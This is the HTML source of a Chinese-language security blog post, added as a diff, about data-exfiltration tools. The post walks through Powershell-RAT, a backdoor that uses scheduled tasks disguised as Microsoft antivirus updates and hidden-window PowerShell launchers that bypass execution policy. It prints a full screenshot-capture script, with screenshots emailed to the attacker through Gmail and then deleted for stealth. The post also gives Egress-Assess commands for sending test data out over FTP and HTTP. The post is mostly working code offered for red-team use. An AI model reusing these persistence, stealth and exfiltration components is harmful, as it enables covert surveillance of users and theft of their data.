@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Powershell-RAT基于Python的后门程序，它使用Gmail将数据作为电子邮件附件进行泄露。 此RAT将帮助红队合作期间的任何人将任何Windows计算机后门。它使用屏幕捕获跟踪用户活动，并将信息作为电子邮件附件发送给攻击者。 1python3 PowershellRAT.py  查看源码 点击数字键执行函数 1234567891011cmds = &amp;#123;	&amp;quot;1&amp;quo">
+<meta name="keywords" content="ATT&amp;CK">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Data Exfiltration">
+<meta property="og:url" content="https://wh0ale.github.io/2019/09/04/Data-Exfiltration/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Powershell-RAT基于Python的后门程序，它使用Gmail将数据作为电子邮件附件进行泄露。 此RAT将帮助红队合作期间的任何人将任何Windows计算机后门。它使用屏幕捕获跟踪用户活动，并将信息作为电子邮件附件发送给攻击者。 1python3 PowershellRAT.py  查看源码 点击数字键执行函数 1234567891011cmds = &amp;#123;	&amp;quot;1&amp;quo">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-06T06:06:24.375Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Data Exfiltration">
+<meta name="twitter:description" content="Powershell-RAT基于Python的后门程序，它使用Gmail将数据作为电子邮件附件进行泄露。 此RAT将帮助红队合作期间的任何人将任何Windows计算机后门。它使用屏幕捕获跟踪用户活动，并将信息作为电子邮件附件发送给攻击者。 1python3 PowershellRAT.py  查看源码 点击数字键执行函数 1234567891011cmds = &amp;#123;	&amp;quot;1&amp;quo">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/09/04/Data-Exfiltration/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Data Exfiltration | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/09/04/Data-Exfiltration/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Data Exfiltration
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-04 17:02:34" itemprop="dateCreated datePublished" datetime="2019-09-04T17:02:34+08:00">2019-09-04</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:06:24" itemprop="dateModified" datetime="2019-09-06T14:06:24+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.3k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="Powershell-RAT"><a href="#Powershell-RAT" class="headerlink" title="Powershell-RAT"></a>Powershell-RAT</h1><p>基于Python的后门程序，它使用Gmail将数据作为电子邮件附件进行泄露。</p>
+<p>此RAT将帮助红队合作期间的任何人将任何Windows计算机后门。它使用屏幕捕获跟踪用户活动，并将信息作为电子邮件附件发送给攻击者。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PowershellRAT.py</span><br></pre></td></tr></table></figure>
+
+<p>查看源码</p>
+<p>点击数字键执行函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmds = &#123;</span><br><span class="line">	&quot;1&quot; : cmd_exectionPolicy,</span><br><span class="line">	&quot;2&quot; : cmd_takeScreenshot,</span><br><span class="line">	&quot;3&quot; : cmd_ScreenShotTaskScheduler,</span><br><span class="line">	&quot;4&quot; : cmd_sendMail,</span><br><span class="line">	&quot;5&quot; : cmd_MailTaskScheduler,</span><br><span class="line">	&quot;6&quot; : cmd_deleteScreenShot,</span><br><span class="line">	&quot;7&quot; : cmd_deleteTaskScheduler,</span><br><span class="line">	&quot;8&quot; : cmd_HailMary,</span><br><span class="line">	&quot;9&quot; : lambda: sys.exit(0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>按1：此选项将执行策略设置为不受限制使用<code>Set-ExecutionPolicy Unrestricted</code>。这在管理员计算机上很有用</li>
+<li>按2：这将使用<code>Shoot.ps1</code>Powershell脚本获取用户计算机上当前屏幕的屏幕截图</li>
+<li>按3：此选项使用户机器后门<code>schtasks</code>并将任务名称设置为<code>MicrosoftAntiVirusCriticalUpdatesCore</code></li>
+<li>按4：此选项使用用户计算机发送电子邮件<code>Powershell</code>。这些使用<code>Mail.ps1</code>文件将截屏作为附件发送到exfiltrate数据</li>
+<li>按5：此选项使用户机器后门<code>schtasks</code>，并将任务名称设置为<code>MicrosoftAntiVirusCriticalUpdatesUA</code></li>
+<li>按6：此选项从用户计算机中删除屏幕截图以保持隐身</li>
+<li>按7：此选项使用户机器后门<code>schtasks</code>并将任务名称设置为<code>MicrosoftAntiVirusCriticalUpdatesDF</code></li>
+<li>按8：此选项<code>press 8</code>通过键盘上的单个按钮执行上述所有操作。攻击者将收到一封电子邮件，每封电子邮件都<code>5 minutes</code>附有屏幕截图。屏幕截图将在删除后删除<code>12 minutes</code></li>
+<li>按9：从程序中正常退出或按 <code>Control+C</code></li>
+</ul>
+<p>README中的<code>cmd_HailMary</code></p>
+<p>查看执行的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell schtasks /create /sc minute /mo 1 /tn MicrosoftAntiVirusCriticalUpdatesCore /tr C:\Python36\Shoot.vbs</span><br><span class="line">powershell schtasks /create /sc minute /mo 5 /tn MicrosoftAntiVirusCriticalUpdatesUA /tr C:\Python36\Mail.vbs</span><br><span class="line">powershell schtasks /create /sc minute /mo 12 /tn MicrosoftAntiVirusCriticalUpdatesDF /tr C:\Python36\delScreenShot.vbs</span><br></pre></td></tr></table></figure>
+
+<p>第一条命令内容：创建一个名为<code>MicrosoftAntiVirusCriticalUpdatesCore</code>的计划任务,然后执行<code>shoot.vbs</code>文件的内容。</p>
+<blockquote>
+<p>管理计划任务<br>SCHTASKS /parameter [arguments]</p>
+<p>/Create         创建新计划任务。</p>
+<p>/Delete         删除计划任务。</p>
+<p>/Query          显示所有计划任务。</p>
+<p>/Change         更改计划任务属性。</p>
+<p> /Run            按需运行计划任务。</p>
+<p>/End            中止当前正在运行的计划任务。</p>
+<p>/ShowSid        显示与计划的任务名称相应的安全标识符。</p>
+<p>f/?              显示帮助消息。</p>
+<p>/SC  schedule     指定计划频率</p>
+<p>/MO   modifier     改进计划类型以允许更好地控制计划重复</p>
+</blockquote>
+<p>shoot.vbs</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> WinScriptHost = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">WinScriptHost.Run <span class="built_in">Chr</span>(<span class="number">34</span>) &amp; <span class="string">"C:\Python36\Shoot.bat"</span> &amp; <span class="built_in">Chr</span>(<span class="number">34</span>), <span class="number">0</span></span><br><span class="line"><span class="keyword">Set</span> WinScriptHost = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>
+
+<p>shoot.bat</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "&amp; 'C:\Python36\Shoot.ps1'"</span><br></pre></td></tr></table></figure>
+
+<p>shoot.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">############################################################################</span><br><span class="line"># Capturing a screenshot</span><br><span class="line">#############################################################################</span><br><span class="line">#Param(</span><br><span class="line">#[Parameter(Mandatory = $true)][string]$Path</span><br><span class="line">#)</span><br><span class="line">$OutPath = &quot;$env:USERPROFILE\Documents\ScreenShot&quot;</span><br><span class="line">if (-not (Test-Path $OutPath))</span><br><span class="line">        &#123;</span><br><span class="line">            New-Item $OutPath -ItemType Directory -Force</span><br><span class="line">        &#125;</span><br><span class="line">$FileName = &quot;$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png&quot;</span><br><span class="line">#$File = &quot;$OutPath\$FileName&quot;</span><br><span class="line">$File = Join-Path $OutPath $fileName</span><br><span class="line">Add-Type -AssemblyName System.Windows.Forms</span><br><span class="line">Add-type -AssemblyName System.Drawing</span><br><span class="line"># Gather Screen resolution information</span><br><span class="line">$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen</span><br><span class="line">$Width = $Screen.Width</span><br><span class="line">$Height = $Screen.Height</span><br><span class="line">$Left = $Screen.Left</span><br><span class="line">$Top = $Screen.Top</span><br><span class="line"># Create bitmap using the top-left and bottom-right bounds</span><br><span class="line">$bitmap = New-Object System.Drawing.Bitmap $Width, $Height</span><br><span class="line"># Create Graphics object</span><br><span class="line">$graphic = [System.Drawing.Graphics]::FromImage($bitmap)</span><br><span class="line"># Capture screen</span><br><span class="line">$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)</span><br><span class="line"># Save to file</span><br><span class="line">$bitmap.Save($File) </span><br><span class="line">#Write-Output &quot;Screenshot saved to:&quot;</span><br><span class="line">Write-Output $File</span><br><span class="line">#############################################################################</span><br></pre></td></tr></table></figure>
+
+<p>powershell文件的意思就是通过<code>$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen</code>设置图像参数，再通过<code>$bitmap = New-Object System.Drawing.Bitmap $Width, $Height</code>获得图像参数，<code>$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)</code>获取图像。</p>
+<p>然后再通过<code>Mail.vbs</code>执行类似操作</p>
+<p>填入发送人gmail信息和收件人gmail地址即可。</p>
+<p>最后<code>delScreenShot.vbs</code>进行删除操作。</p>
+<h1 id="Egress-Assess"><a href="#Egress-Assess" class="headerlink" title="Egress-Assess"></a>Egress-Assess</h1><p>安装模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dnslib</span><br><span class="line">pyftpdlib</span><br><span class="line">scapy</span><br><span class="line">paramiko</span><br><span class="line">impacket</span><br></pre></td></tr></table></figure>
+
+<p>选择<code>STMP</code>,<code>ICMP</code>,<code>ftp</code>,<code>SFTP</code>,<code>SMB</code>,<code>DNS_TXT</code>,<code>DNS_Reslove</code>服务测试出口数据检测功能，助横向移动。</p>
+<p>针对FTP</p>
+<p>服务端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Egress-Assess.py --server ftp --username testuser --password pass123</span><br></pre></td></tr></table></figure>
+
+<p>客户端（也就是要横向移动的目标）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Egress-Assess.py --client ftp --username test --password pass --datatype ssn --ip 192.168.63.149</span><br></pre></td></tr></table></figure>
+
+<p>在与Egress-Assess相同的目录中，将创建“数据”目录。在其中将存储所有传输的文件。此时，通过FTP完成传输.</p>
+<p>针对HTTP</p>
+<p>默认情况下，Egress-Assess将生成大约1兆字节的数据（社会安全号码或信用卡号码）</p>
+<p>服务端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Egress-Assess.py --server http</span><br></pre></td></tr></table></figure>
+
+<p>客户端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Egress-Assess.py --client http --data-size 15 --ip 10.0.85.55 --datatype cc</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/09/04/Data-Exfiltration/" title="Data Exfiltration">https://wh0ale.github.io/2019/09/04/Data-Exfiltration/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/ATT-CK/" rel="tag"><i class="fa fa-tag"></i># ATT&CK</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/09/02/子域名接管/" rel="next" title="子域名接管">
+                <i class="fa fa-chevron-left"></i> 子域名接管
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/09/06/Cookie-Based-XSS-to-Reflected-XSS/" rel="prev" title="Cookie Based XSS to Reflected XSS">
+                Cookie Based XSS to Reflected XSS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Powershell-RAT"><span class="nav-number">1.</span> <span class="nav-text">Powershell-RAT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Egress-Assess"><span class="nav-number">2.</span> <span class="nav-text">Egress-Assess</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
